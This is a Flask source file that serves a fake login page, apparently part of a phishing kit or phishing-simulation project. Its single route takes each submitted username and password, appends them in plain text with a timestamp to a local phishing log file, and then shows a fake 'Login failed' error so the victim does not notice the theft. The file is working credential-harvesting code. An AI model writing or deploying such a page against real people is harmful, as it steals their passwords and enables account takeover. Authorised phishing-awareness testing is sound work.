# app.py
# ----------------------------------------
# Hosts the fake login page using Flask
# ----------------------------------------

from flask import Flask, request, render_template
from datetime import datetime
import json

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Extract form input
        username = request.form.get("username")
        password = request.form.get("password")
        timestamp = datetime.now().isoformat()

        # Log data to a JSON file
        with open("../reports/phish_log.json", "a") as log:
            json.dump({"username": username, "password": password, "timestamp": timestamp}, log)
            log.write("\n")

        return "Login failed. Try again later."  # Fake error
    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)
